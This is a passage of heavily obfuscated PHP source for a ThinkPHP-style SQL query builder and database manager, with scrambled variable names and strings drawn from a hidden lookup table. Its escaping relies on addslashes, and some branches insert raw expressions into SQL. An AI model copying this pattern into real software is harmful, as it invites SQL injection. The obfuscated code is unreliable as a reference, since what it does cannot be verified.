trim($‰§·ñ½Ù); if (!preg_match($±ÒÕÄÃÁ[1039], $‰§·ñ½Ù)) { think_exception($±ÒÕÄÃÁ[1040] . $‰§·ñ½Ù); } return $‰§·ñ½Ù; } protected function parseValue($Íîïœä·) { $úÕ‰£çÔ =& $_SERVER[³½¬ÚË¯]; if (is_string($Íîïœä·)) { $Íîïœä· = $úÕ‰£çÔ[1000] . $this->escapeString($Íîïœä·) . $úÕ‰£çÔ[1000]; } elseif (isset($Íîïœä·[0]) && is_string($Íîïœä·[0]) && strtolower($Íîïœä·[0]) == $úÕ‰£çÔ[341]) { $Íîïœä· = $this->escapeString($Íîïœä·[1]); } elseif (is_array($Íîïœä·)) { $Íîïœä· = array_map(array($this, $úÕ‰£çÔ[1001]), $Íîïœä·); } elseif (is_bool($Íîïœä·)) { $Íîïœä· = $Íîïœä· ? $úÕ‰£çÔ[88] : $úÕ‰£çÔ[212]; } elseif (is_null($Íîïœä·)) { $Íîïœä· = $úÕ‰£çÔ[103]; } return $Íîïœä·; } protected function parseField($¤ù©òÙı) { $‚ÛŠÑ¢± =& $_SERVER[³½¬ÚË¯]; if (is_string($¤ù©òÙı) && strpos($¤ù©òÙı, $‚ÛŠÑ¢±[50])) { $¤ù©òÙı = explode($‚ÛŠÑ¢±[50], $¤ù©òÙı); } if (is_array($¤ù©òÙı)) { $…‡Ï·Áï = array(); foreach ($¤ù©òÙı as $¥Ô§øõÇ => $ñ…¹ˆŒÎ) { if (!is_numeric($¥Ô§øõÇ)) { $…‡Ï·Áï[] = $this->parseKey($¥Ô§øõÇ, !1) . $‚ÛŠÑ¢±[1041] . $this->parseKey($ñ…¹ˆŒÎ); } else { $…‡Ï·Áï[] = $this->parseKey($ñ…¹ˆŒÎ); } } $¹ÉŠˆ¢Ú = implode($‚ÛŠÑ¢±[50], $…‡Ï·Áï); } elseif (is_string($¤ù©òÙı) && !empty($¤ù©òÙı)) { $¹ÉŠˆ¢Ú = $¤ù©òÙı; } else { $¹ÉŠˆ¢Ú = $‚ÛŠÑ¢±[203]; } return $¹ÉŠˆ¢Ú; } protected function parseTable($»ş‘¬ìË) { $­û“ÔõŞ =& $_SERVER[³½¬ÚË¯]; if (is_array($»ş‘¬ìË)) { $ãŒ•ö±² = array(); foreach ($»ş‘¬ìË as $ÓÇğ¯Ù÷ => $áĞ¶öõ) { if (!is_numeric($ÓÇğ¯Ù÷)) { $ãŒ•ö±²[] = $this->parseKey($ÓÇğ¯Ù÷) . $­û“ÔõŞ[53] . $this->parseKey($áĞ¶öõ); } else { $ãŒ•ö±²[] = $this->parseKey($ÓÇğ¯Ù÷); } } $»ş‘¬ìË = $ãŒ•ö±²; } elseif (is_string($»ş‘¬ìË)) { if (strstr($»ş‘¬ìË, $­û“ÔõŞ[53])) { return $»ş‘¬ìË; } $»ş‘¬ìË = explode($­û“ÔõŞ[50], $»ş‘¬ìË); array_walk($»ş‘¬ìË, array($this, $­û“ÔõŞ[949])); } return $­û“ÔõŞ[943] . trim(implode($­û“ÔõŞ[1042], $»ş‘¬ìË), $­û“ÔõŞ[429]) . $­û“ÔõŞ[943]; } protected function parseWhere($ŒúşïÎ) { $‘ş™—Ù– =& $_SERVER[³½¬ÚË¯]; $“Àíó¥‰ = $‘ş™—Ù–[12]; if (is_string($ŒúşïÎ)) { $“Àíó¥‰ = $ŒúşïÎ; } else { $Ç§š‰¢‡ = isset($ŒúşïÎ[$‘ş™—Ù–[1043]]) ? strtoupper($ŒúşïÎ[$‘ş™—Ù–[1043]]) : $‘ş™—Ù–[12]; if (in_array($Ç§š‰¢‡, array($‘ş™—Ù–[1044], $‘ş™—Ù–[1045], $‘ş™—Ù–[1046]))) { $Ç§š‰¢‡ = $‘ş™—Ù–[53] . $Ç§š‰¢‡ . $‘ş™—Ù–[53]; unset($ŒúşïÎ[$‘ş™—Ù–[1043]]); } else { $Ç§š‰¢‡ = $‘ş™—Ù–[1047]; } foreach ($ŒúşïÎ as $÷ú–ë¸  => $¯ÒæÜ“‰) { $“Àíó¥‰ .= $‘ş™—Ù–[321]; if (is_numeric($÷ú–ë¸ )) { $÷ú–ë¸  = $‘ş™—Ù–[1048]; } if (0 === strpos($÷ú–ë¸ , $‘ş™—Ù–[11])) { $“Àíó¥‰ .= $this->parseThinkWhere($÷ú–ë¸ , $¯ÒæÜ“‰); } else { if (!preg_match($‘ş™—Ù–[1049], trim($÷ú–ë¸ ))) { think_exception(think_lang($‘ş™—Ù–[1050]) . $‘ş™—Ù–[4] . $÷ú–ë¸ ); } $Áı”Üª  = is_array($¯ÒæÜ“‰) && isset($¯ÒæÜ“‰[$‘ş™—Ù–[1051]]); $÷ú–ë¸  = trim($÷ú–ë¸ ); if (strpos($÷ú–ë¸ , $‘ş™—Ù–[327])) { $›¹„¹·Æ = explode($‘ş™—Ù–[327], $÷ú–ë¸ ); $í±×©¡© = array(); foreach ($›¹„¹·Æ as $œÆÖÃ‹é => $èŒÚ°ªÖ) { $ÎõÊÈÉß = $Áı”Üª  ? $¯ÒæÜ“‰[$œÆÖÃ‹é] : $¯ÒæÜ“‰; $í±×©¡©[] = $‘ş™—Ù–[304] . $this->parseWhereItem($this->parseKey($èŒÚ°ªÖ), $ÎõÊÈÉß) . $‘ş™—Ù–[948]; } $“Àíó¥‰ .= implode($‘ş™—Ù–[1052], $í±×©¡©); } elseif (strpos($÷ú–ë¸ , $‘ş™—Ù–[328])) { $›¹„¹·Æ = explode($‘ş™—Ù–[328], $÷ú–ë¸ ); $í±×©¡© = array(); foreach ($›¹„¹·Æ as $œÆÖÃ‹é => $èŒÚ°ªÖ) { $ÎõÊÈÉß = $Áı”Üª  ? $¯ÒæÜ“‰[$œÆÖÃ‹é] : $¯ÒæÜ“‰; $í±×©¡©[] = $‘ş™—Ù–[304] . $this->parseWhereItem($this->parseKey($èŒÚ°ªÖ), $ÎõÊÈÉß) . $‘ş™—Ù–[948]; } $“Àíó¥‰ .= implode($‘ş™—Ù–[1047], $í±×©¡©); } else { $“Àíó¥‰ .= $this->parseWhereItem($this->parseKey($÷ú–ë¸ ), $¯ÒæÜ“‰); } } $“Àíó¥‰ .= $‘ş™—Ù–[322] . $Ç§š‰¢‡; } $“Àíó¥‰ = substr($“Àíó¥‰, 0, -strlen($Ç§š‰¢‡)); } return empty($“Àíó¥‰) ? $‘ş™—Ù–[12] : $‘ş™—Ù–[1053] . $“Àíó¥‰; } protected function parseWhereItem($ÓîçœŒÆ, $›Â‡›âÛ) { $ŠÆšÙÈĞ =& $_SERVER[³½¬ÚË¯]; $ª»­úÍ­ = $ŠÆšÙÈĞ[12]; if (is_array($›Â‡›âÛ)) { if (is_string($›Â‡›âÛ[0])) { $¯›çÆ¾™ = strtolower($›Â‡›âÛ[0]); if (in_array($›Â‡›âÛ[0], array($ŠÆšÙÈĞ[927], $ŠÆšÙÈĞ[1054], $ŠÆšÙÈĞ[1055], $ŠÆšÙÈĞ[1056], $ŠÆšÙÈĞ[1057], $ŠÆšÙÈĞ[1058]))) { $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $›Â‡›âÛ[0] . $ŠÆšÙÈĞ[53] . $this->parseValue($›Â‡›âÛ[1]); } elseif (preg_match($ŠÆšÙÈĞ[1059], $›Â‡›âÛ[0])) { $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[53] . $this->parseValue($›Â‡›âÛ[1]); } elseif (preg_match($ŠÆšÙÈĞ[1060], $›Â‡›âÛ[0])) { if (is_array($›Â‡›âÛ[1])) { $˜÷è¥´— = isset($›Â‡›âÛ[2]) ? strtoupper($›Â‡›âÛ[2]) : $ŠÆšÙÈĞ[1045]; if (in_array($˜÷è¥´—, array($ŠÆšÙÈĞ[1044], $ŠÆšÙÈĞ[1045], $ŠÆšÙÈĞ[1046]))) { $ŒÎ = array(); foreach ($›Â‡›âÛ[1] as $§¯­¨‚Ó) { $ŒÎ[] = $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[53] . $this->parseValue($§¯­¨‚Ó); } $ª»­úÍ­ .= $ŠÆšÙÈĞ[304] . implode($ŠÆšÙÈĞ[53] . $˜÷è¥´— . $ŠÆšÙÈĞ[53], $ŒÎ) . $ŠÆšÙÈĞ[948]; } } else { $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[53] . $this->parseValue($›Â‡›âÛ[1]); } } elseif ($ŠÆšÙÈĞ[341] == $¯›çÆ¾™) { $ª»­úÍ­ .= $ŠÆšÙÈĞ[946] . $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $›Â‡›âÛ[1] . $ŠÆšÙÈĞ[1061]; } elseif (preg_match($ŠÆšÙÈĞ[1062], $›Â‡›âÛ[0])) { $ª»­úÍ­ .= $›Â‡›âÛ[0]; } elseif (preg_match($ŠÆšÙÈĞ[1063], $›Â‡›âÛ[0])) { if (isset($›Â‡›âÛ[2]) && $ŠÆšÙÈĞ[341] == $›Â‡›âÛ[2]) { $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[53] . $›Â‡›âÛ[1]; } else { if (is_string($›Â‡›âÛ[1])) { $›Â‡›âÛ[1] = explode($ŠÆšÙÈĞ[50], $›Â‡›âÛ[1]); } $ßÀ—ûÃ = implode($ŠÆšÙÈĞ[50], $this->parseValue($›Â‡›âÛ[1])); $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[946] . $ßÀ—ûÃ . $ŠÆšÙÈĞ[948]; } } elseif (preg_match($ŠÆšÙÈĞ[1064], $›Â‡›âÛ[0])) { $‹ë°–“ = is_string($›Â‡›âÛ[1]) ? explode($ŠÆšÙÈĞ[50], $›Â‡›âÛ[1]) : $›Â‡›âÛ[1]; $ª»­úÍ­ .= $ŠÆšÙÈĞ[946] . $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $this->exp[$¯›çÆ¾™] . $ŠÆšÙÈĞ[53] . $this->parseValue($‹ë°–“[0]) . $ŠÆšÙÈĞ[1047] . $this->parseValue($‹ë°–“[1]) . $ŠÆšÙÈĞ[322]; } else { think_exception(think_lang($ŠÆšÙÈĞ[1050]) . $ŠÆšÙÈĞ[4] . $›Â‡›âÛ[0]); } } else { $¹ƒÃª© = count($›Â‡›âÛ); $±—×›Á = $ŠÆšÙÈĞ[12]; if (is_string($›Â‡›âÛ[$¹ƒÃª© - 1])) { $±—×›Á = isset($›Â‡›âÛ[$¹ƒÃª© - 1]) ? strtoupper($›Â‡›âÛ[$¹ƒÃª© - 1]) : $ŠÆšÙÈĞ[12]; if (in_array($±—×›Á, array($ŠÆšÙÈĞ[1044], $ŠÆšÙÈĞ[1045], $ŠÆšÙÈĞ[1046]))) { $¹ƒÃª© = $¹ƒÃª© - 1; } } else { $±—×›Á = $ŠÆšÙÈĞ[1044]; } for ($Ú€ÅÒÌ = 0; $Ú€ÅÒÌ < $¹ƒÃª©; $Ú€ÅÒÌ++) { $‹ë°–“ = is_array($›Â‡›âÛ[$Ú€ÅÒÌ]) ? $›Â‡›âÛ[$Ú€ÅÒÌ][1] : $›Â‡›âÛ[$Ú€ÅÒÌ]; if ($ŠÆšÙÈĞ[341] == strtolower($›Â‡›âÛ[$Ú€ÅÒÌ][0])) { $ª»­úÍ­ .= $ŠÆšÙÈĞ[304] . $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $‹ë°–“ . $ŠÆšÙÈĞ[1061] . $±—×›Á . $ŠÆšÙÈĞ[53]; } else { $”„œÀÜó = is_array($›Â‡›âÛ[$Ú€ÅÒÌ]) ? $this->exp[strtolower($›Â‡›âÛ[$Ú€ÅÒÌ][0])] : $ŠÆšÙÈĞ[927]; if (!$”„œÀÜó && is_array($›Â‡›âÛ[$Ú€ÅÒÌ]) && in_array($›Â‡›âÛ[$Ú€ÅÒÌ][0], array($ŠÆšÙÈĞ[927], $ŠÆšÙÈĞ[1054], $ŠÆšÙÈĞ[1055], $ŠÆšÙÈĞ[1056], $ŠÆšÙÈĞ[1057], $ŠÆšÙÈĞ[1058]))) { $”„œÀÜó = $›Â‡›âÛ[$Ú€ÅÒÌ][0]; } $ª»­úÍ­ .= $ŠÆšÙÈĞ[304] . $ÓîçœŒÆ . $ŠÆšÙÈĞ[53] . $”„œÀÜó . $ŠÆšÙÈĞ[53] . $this->parseValue($‹ë°–“) . $ŠÆšÙÈĞ[1061] . $±—×›Á . $ŠÆšÙÈĞ[53]; } } $ª»­úÍ­ = substr($ª»­úÍ­, 0, -4); } } else { $ª»­úÍ­ .= $ÓîçœŒÆ . $ŠÆšÙÈĞ[1065] . $this->parseValue($›Â‡›âÛ); } return $ª»­úÍ­; } protected function parseThinkWhere($æ°·Ÿµí, $›È”íçû) { $å²â‘ãÙ =& $_SERVER[³½¬ÚË¯]; $†‘ƒÒÉ = $å²â‘ãÙ[12]; switch ($æ°·Ÿµí) { case $å²â‘ãÙ[396]: $†‘ƒÒÉ = $›È”íçû; break; case $å²â‘ãÙ[1048]: $†‘ƒÒÉ = is_string($›È”íçû) ? $›È”íçû : substr($this->parseWhere($›È”íçû), 6); break; case $å²â‘ãÙ[1066]: parse_str($›È”íçû, $ÁÏúĞò); if (isset($ÁÏúĞò[$å²â‘ãÙ[1043]])) { $Öãç•æø = $å²â‘ãÙ[53] . strtoupper($ÁÏúĞò[$å²â‘ãÙ[1043]]) . $å²â‘ãÙ[53]; unset($ÁÏúĞò[$å²â‘ãÙ[1043]]); } else { $Öãç•æø = $å²â‘ãÙ[1047]; } $Öê€ùšâ = array(); foreach ($ÁÏúĞò as $¯°ñãÓ¢ => $Ø‰©õ’®) { $Öê€ùšâ[] = $this->parseKey($¯°ñãÓ¢) . $å²â‘ãÙ[1065] . $this->parseValue($Ø‰©õ’®); } $†‘ƒÒÉ = implode($Öãç•æø, $Öê€ùšâ); break; } return $†‘ƒÒÉ; } protected function parseLimit($Î¢ê¢Áì) { $ûí›Û‡ =& $_SERVER[³½¬ÚË¯]; return !empty($Î¢ê¢Áì) ? $ûí›Û‡[51] . $Î¢ê¢Áì . $ûí›Û‡[53] : $ûí›Û‡[12]; } protected function parseJoin($ûñÃäœÈ) { $ØÌ•¬ü‹ =& $_SERVER[³½¬ÚË¯]; $çÔïòÊ = $ØÌ•¬ü‹[12]; if (!empty($ûñÃäœÈ)) { if (is_array($ûñÃäœÈ)) { foreach ($ûñÃäœÈ as $á·óúÊ¸ => $¢éÊöä) { if (!1 !== stripos($¢éÊöä, $ØÌ•¬ü‹[1067])) { $çÔïòÊ .= $ØÌ•¬ü‹[53] . $¢éÊöä; } else { $çÔïòÊ .= $ØÌ•¬ü‹[1068] . $¢éÊöä; } } } else { $çÔïòÊ .= $ØÌ•¬ü‹[1068] . $ûñÃäœÈ; } } $çÔïòÊ = preg_replace($ØÌ•¬ü‹[1069], think_config($ØÌ•¬ü‹[973]) . $ØÌ•¬ü‹[1070], $çÔïòÊ); return $çÔïòÊ; } protected function parseOrder($ÚïªÖù) { $ƒ„„×¬¿ =& $_SERVER[³½¬ÚË¯]; if (is_array($ÚïªÖù)) { $©ÌÓØö = array(); foreach ($ÚïªÖù as $’ØËœÚê => $ÀãñöÛ§) { if (is_numeric($’ØËœÚê)) { $©ÌÓØö[] = $this->parseKey($ÀãñöÛ§); } else { $ÀãñöÛ§ = in_array(strtoupper(trim($ÀãñöÛ§)), array($ƒ„„×¬¿[1071], $ƒ„„×¬¿[1072])) ? $ƒ„„×¬¿[53] . $ÀãñöÛ§ : $ƒ„„×¬¿[12]; if (preg_match($ƒ„„×¬¿[1073], $’ØËœÚê)) { $©ÌÓØö[] = $this->parseKey($’ØËœÚê) . $ÀãñöÛ§; } else { think_exception($ƒ„„×¬¿[1074] . $’ØËœÚê); } } } $ÚïªÖù = implode($ƒ„„×¬¿[50], $©ÌÓØö); } return !empty($ÚïªÖù) ? $ƒ„„×¬¿[1075] . $ÚïªÖù : $ƒ„„×¬¿[12]; } protected function parseGroup($™†Ñİá) { $œ·öƒŸß =& $_SERVER[³½¬ÚË¯]; return !empty($™†Ñİá) ? $œ·öƒŸß[1076] . $™†Ñİá : $œ·öƒŸß[12]; } protected function parseHaving($ß¬“ÛïÑ) { $õ—ì»â =& $_SERVER[³½¬ÚË¯]; return !empty($ß¬“ÛïÑ) ? $õ—ì»â[1077] . $ß¬“ÛïÑ : $õ—ì»â[12]; } protected function parseComment($ş›­¿°Â) { $Æô»µ®õ =& $_SERVER[³½¬ÚË¯]; return !empty($ş›­¿°Â) ? $Æô»µ®õ[1078] . $ş›­¿°Â . $Æô»µ®õ[1079] : $Æô»µ®õ[12]; } protected function parseDistinct($áÅéêñ ) { $šÇ€•·Ù =& $_SERVER[³½¬ÚË¯]; return !empty($áÅéêñ ) ? $šÇ€•·Ù[1080] : $šÇ€•·Ù[12]; } protected function parseUnion($ĞÂ²Ù) { $£æ¯®É© =& $_SERVER[³½¬ÚË¯]; if (empty($ĞÂ²Ù)) { return $£æ¯®É©[12]; } if (isset($ĞÂ²Ù[$£æ¯®É©[392]])) { $”€ù‚äÉ = $£æ¯®É©[1081]; unset($ĞÂ²Ù[$£æ¯®É©[392]]); } else { $”€ù‚äÉ = $£æ¯®É©[1082]; } foreach ($ĞÂ²Ù as $â«¨Êƒã) { $¡Ø¾÷ùş[] = $”€ù‚äÉ . (is_array($â«¨Êƒã) ? $this->buildSelectSql($â«¨Êƒã) : $â«¨Êƒã); } return implode($£æ¯®É©[53], $¡Ø¾÷ùş); } public function insert($Æ‘ğÛıÖ, $üùÂ®‚ = array(), $ˆ¹ö„Å” = false) { $› ³Ô®™ =& $_SERVER[³½¬ÚË¯]; $¡Æ‚û«Í = $¬˜úø¼ = array(); $this->model = $üùÂ®‚[$› ³Ô®™[325]]; foreach ($Æ‘ğÛıÖ as $»Ë²— æ => $¤¤ƒÕÚ) { if (is_array($¤¤ƒÕÚ) && $› ³Ô®™[341] == $¤¤ƒÕÚ[0]) { $¬˜úø¼[] = $this->parseKey($»Ë²— æ); $¡Æ‚û«Í[] = $¤¤ƒÕÚ[1]; } elseif (is_scalar($¤¤ƒÕÚ) || is_null($¤¤ƒÕÚ)) { $¬˜úø¼[] = $this->parseKey($»Ë²— æ); $¡Æ‚û«Í[] = $this->parseValue($¤¤ƒÕÚ); } } $¤¹©ÎŞ³ = ($ˆ¹ö„Å” ? $› ³Ô®™[950] : $› ³Ô®™[951]) . $› ³Ô®™[952] . $this->parseTable($üùÂ®‚[$› ³Ô®™[323]]) . $› ³Ô®™[946] . implode($› ³Ô®™[50], $¬˜úø¼) . $› ³Ô®™[947] . implode($› ³Ô®™[50], $¡Æ‚û«Í) . $› ³Ô®™[948]; $¤¹©ÎŞ³ .= $this->parseLock(isset($üùÂ®‚[$› ³Ô®™[880]]) ? $üùÂ®‚[$› ³Ô®™[880]] : !1); $¤¹©ÎŞ³ .= $this->parseComment(!empty($üùÂ®‚[$› ³Ô®™[398]]) ? $üùÂ®‚[$› ³Ô®™[398]] : $› ³Ô®™[12]); return $this->execute($¤¹©ÎŞ³, $this->parseBind(!empty($üùÂ®‚[$› ³Ô®™[329]]) ? $üùÂ®‚[$› ³Ô®™[329]] : array())); } public function selectInsert($ ë¥È, $’Øëúƒ, $Ç×ØıõŒ = array()) { $û½±ï–Ó =& $_SERVER[³½¬ÚË¯]; $this->model = $Ç×ØıõŒ[$û½±ï–Ó[325]]; if (is_string($ ë¥È)) { $ ë¥È = explode($û½±ï–Ó[50], $ ë¥È); } array_walk($ ë¥È, array($this, $û½±ï–Ó[949])); $ ıùû¯ = $û½±ï–Ó[1083] . $this->parseTable($’Øëúƒ) . $û½±ï–Ó[946] . implode($û½±ï–Ó[50], $ ë¥È) . $û½±ï–Ó[1061]; $ ıùû¯ .= $this->buildSelectSql($Ç×ØıõŒ); return $this->execute($ ıùû¯, $this->parseBind(!empty($Ç×ØıõŒ[$û½±ï–Ó[329]]) ? $Ç×ØıõŒ[$û½±ï–Ó[329]] : array())); } public function update($­€¤©í, $ÚÛ‚ÊÊ£) { $ÅâïÊ— =& $_SERVER[³½¬ÚË¯]; $this->model = $ÚÛ‚ÊÊ£[$ÅâïÊ—[325]]; $î…˜ˆ¸Ã = $ÅâïÊ—[1084] . $this->parseTable($ÚÛ‚ÊÊ£[$ÅâïÊ—[323]]) . $this->parseSet($­€¤©í) . $this->parseWhere(!empty($ÚÛ‚ÊÊ£[$ÅâïÊ—[319]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[319]] : $ÅâïÊ—[12]) . $this->parseOrder(!empty($ÚÛ‚ÊÊ£[$ÅâïÊ—[409]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[409]] : $ÅâïÊ—[12]) . $this->parseLimit(!empty($ÚÛ‚ÊÊ£[$ÅâïÊ—[336]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[336]] : $ÅâïÊ—[12]) . $this->parseLock(isset($ÚÛ‚ÊÊ£[$ÅâïÊ—[880]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[880]] : !1) . $this->parseComment(!empty($ÚÛ‚ÊÊ£[$ÅâïÊ—[398]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[398]] : $ÅâïÊ—[12]); return $this->execute($î…˜ˆ¸Ã, $this->parseBind(!empty($ÚÛ‚ÊÊ£[$ÅâïÊ—[329]]) ? $ÚÛ‚ÊÊ£[$ÅâïÊ—[329]] : array())); } public function delete($––óì² = array()) { $ù ²™íº =& $_SERVER[³½¬ÚË¯]; $this->model = $––óì²[$ù ²™íº[325]]; $¦¬Œòô = $ù ²™íº[1085] . $this->parseTable($––óì²[$ù ²™íº[323]]) . $this->parseWhere(!empty($––óì²[$ù ²™íº[319]]) ? $––óì²[$ù ²™íº[319]] : $ù ²™íº[12]) . $this->parseOrder(!empty($––óì²[$ù ²™íº[409]]) ? $––óì²[$ù ²™íº[409]] : $ù ²™íº[12]) . $this->parseLimit(!empty($––óì²[$ù ²™íº[336]]) ? $––óì²[$ù ²™íº[336]] : $ù ²™íº[12]) . $this->parseLock(isset($––óì²[$ù ²™íº[880]]) ? $––óì²[$ù ²™íº[880]] : !1) . $this->parseComment(!empty($––óì²[$ù ²™íº[398]]) ? $––óì²[$ù ²™íº[398]] : $ù ²™íº[12]); return $this->execute($¦¬Œòô, $this->parseBind(!empty($––óì²[$ù ²™íº[329]]) ? $––óì²[$ù ²™íº[329]] : array())); } public function select($ğ¯Â‰§ì = array()) { $¯ıŒ­¡€ =& $_SERVER[³½¬ÚË¯]; $this->model = $ğ¯Â‰§ì[$¯ıŒ­¡€[325]]; $‘“‚Çä” = $this->buildSelectSql($ğ¯Â‰§ì); $ªÈîÆºü = isset($ğ¯Â‰§ì[$¯ıŒ­¡€[393]]) ? $ğ¯Â‰§ì[$¯ıŒ­¡€[393]] : !1; if ($ªÈîÆºü) { $Œº¢ëªÀ = is_string($ªÈîÆºü[$¯ıŒ­¡€[94]]) ? $ªÈîÆºü[$¯ıŒ­¡€[94]] : $¯ıŒ­¡€[1086] . md5($‘“‚Çä”); $÷ê‡õ² = think_cache($Œº¢ëªÀ, $¯ıŒ­¡€[12], $ªÈîÆºü); if (!1 !== $÷ê‡õ²) { return $÷ê‡õ²; } } $§¤ç¡µ· = $this->query($‘“‚Çä”, $this->parseBind(!empty($ğ¯Â‰§ì[$¯ıŒ­¡€[329]]) ? $ğ¯Â‰§ì[$¯ıŒ­¡€[329]] : array())); if ($ªÈîÆºü && !1 !== $§¤ç¡µ·) { think_cache($Œº¢ëªÀ, $§¤ç¡µ·, $ªÈîÆºü); } return $§¤ç¡µ·; } public function buildSelectSql($è‚‚“òò = array()) { $Ï“Ã£ ™ =& $_SERVER[³½¬ÚË¯]; if (isset($è‚‚“òò[$Ï“Ã£ ™[397]])) { if (strpos($è‚‚“òò[$Ï“Ã£ ™[397]], $Ï“Ã£ ™[50])) { list($°µ•Š­, $…Ñ€ƒ«˜) = explode($Ï“Ã£ ™[50], $è‚‚“òò[$Ï“Ã£ ™[397]]); } else { $°µ•Š­ = $è‚‚“òò[$Ï“Ã£ ™[397]]; } $°µ•Š­ = $°µ•Š­ ? $°µ•Š­ : 1; $…Ñ€ƒ«˜ = isset($…Ñ€ƒ«˜) ? $…Ñ€ƒ«˜ : (is_numeric($è‚‚“òò[$Ï“Ã£ ™[336]]) ? $è‚‚“òò[$Ï“Ã£ ™[336]] : 20); $ÔŒ£ò§é = $…Ñ€ƒ«˜ * ((int) $°µ•Š­ - 1); $è‚‚“òò[$Ï“Ã£ ™[336]] = $ÔŒ£ò§é . $Ï“Ã£ ™[50] . $…Ñ€ƒ«˜; } if (think_config($Ï“Ã£ ™[1087])) { $ÛÈ„Û¶¬ = $Ï“Ã£ ™[1088] . md5(serialize($è‚‚“òò)); $‰Ú—¬ñÉ = think_cache($ÛÈ„Û¶¬); if ($‰Ú—¬ñÉ) { return $‰Ú—¬ñÉ; } } $Å»õ¦ = $this->parseSql($this->selectSql, $è‚‚“òò); $Å»õ¦ .= $this->parseLock(isset($è‚‚“òò[$Ï“Ã£ ™[880]]) ? $è‚‚“òò[$Ï“Ã£ ™[880]] : !1); if (isset($ÛÈ„Û¶¬)) { think_cache($ÛÈ„Û¶¬, $Å»õ¦); } return $Å»õ¦; } public function parseSql($«Ï·£¨, $õÄùªß¼ = array()) { $ªÈÜÅËÚ =& $_SERVER[³½¬ÚË¯]; $«Ï·£¨ = str_replace(array($ªÈÜÅËÚ[1089], $ªÈÜÅËÚ[1090], $ªÈÜÅËÚ[1091], $ªÈÜÅËÚ[1092], $ªÈÜÅËÚ[1093], $ªÈÜÅËÚ[1094], $ªÈÜÅËÚ[1095], $ªÈÜÅËÚ[1096], $ªÈÜÅËÚ[1097], $ªÈÜÅËÚ[1098], $ªÈÜÅËÚ[1099]), array($this->parseTable("{$õÄùªß¼[$ªÈÜÅËÚ[323]]}"), $this->parseDistinct(isset($õÄùªß¼[$ªÈÜÅËÚ[1100]]) ? $õÄùªß¼[$ªÈÜÅËÚ[1100]] : !1), $this->parseField(!empty($õÄùªß¼[$ªÈÜÅËÚ[317]]) ? $õÄùªß¼[$ªÈÜÅËÚ[317]] : $ªÈÜÅËÚ[203]), $this->parseJoin(!empty($õÄùªß¼[$ªÈÜÅËÚ[326]]) ? $õÄùªß¼[$ªÈÜÅËÚ[326]] : $ªÈÜÅËÚ[12]), $this->parseWhere(!empty($õÄùªß¼[$ªÈÜÅËÚ[319]]) ? $õÄùªß¼[$ªÈÜÅËÚ[319]] : $ªÈÜÅËÚ[12]), $this->parseGroup(!empty($õÄùªß¼[$ªÈÜÅËÚ[548]]) ? $õÄùªß¼[$ªÈÜÅËÚ[548]] : $ªÈÜÅËÚ[12]), $this->parseHaving(!empty($õÄùªß¼[$ªÈÜÅËÚ[1101]]) ? $õÄùªß¼[$ªÈÜÅËÚ[1101]] : $ªÈÜÅËÚ[12]), $this->parseOrder(!empty($õÄùªß¼[$ªÈÜÅËÚ[409]]) ? $õÄùªß¼[$ªÈÜÅËÚ[409]] : $ªÈÜÅËÚ[12]), $this->parseLimit(!empty($õÄùªß¼[$ªÈÜÅËÚ[336]]) ? $õÄùªß¼[$ªÈÜÅËÚ[336]] : $ªÈÜÅËÚ[12]), $this->parseUnion(!empty($õÄùªß¼[$ªÈÜÅËÚ[391]]) ? $õÄùªß¼[$ªÈÜÅËÚ[391]] : $ªÈÜÅËÚ[12]), $this->parseComment(!empty($õÄùªß¼[$ªÈÜÅËÚ[398]]) ? $õÄùªß¼[$ªÈÜÅËÚ[398]] : $ªÈÜÅËÚ[12])), $«Ï·£¨); return $«Ï·£¨; } public function getLastSql($ÃÌÙí‡ = '') { return $ÃÌÙí‡ ? $this->modelSql[$ÃÌÙí‡] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÍÃ¯ì‚) { return addslashes($ÍÃ¯ì‚); } public function setModel($Œğ«çı) { $this->model = $Œğ«çı; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Éç×”ì© = array()) { $çĞÙ¥ùÒ =& $_SERVER[³½¬ÚË¯]; if (empty($Éç×”ì©)) { $Éç×”ì© = $GLOBALS[$çĞÙ¥ùÒ[6]][$çĞÙ¥ùÒ[21]]; } $this->database = $Éç×”ì©; } public function model($ßË¿ûŠ© = '') { return new ModelBase($ßË¿ûŠ©, $_SERVER[³½¬ÚË¯][12], $this->database); } public function db($³ıßÂ©Õ = false) { $úş‰Ã—½ =& $_SERVER[³½¬ÚË¯]; $”Û¢Òá¤ = array_change_key_case($this->database); if ($this->dbType() == $úş‰Ã—½[13] || !$³ıßÂ©Õ) { return $this->model()->db(); } $·¤Ÿ‘‡ = $”Û¢Òá¤[$úş‰Ã—½[1015]]; $”Û¢Òá¤[$úş‰Ã—½[1015]] = $úş‰Ã—½[12]; if ($”Û¢Òá¤[$úş‰Ã—½[1010]] == $úş‰Ã—½[1007]) { $Ó¦î†§È = $”Û¢Òá¤[$úş‰Ã—½[1016]]; $”Û¢Òá¤[$úş‰Ã—½[1016]] = substr($Ó¦î†§È, 0, strrpos($Ó¦î†§È, $úş‰Ã—½[1102])); } $this->database = $”Û¢Òá¤; $°ºê†ª¡ = $this->model()->db(); try { $ìñëù‰¦ = 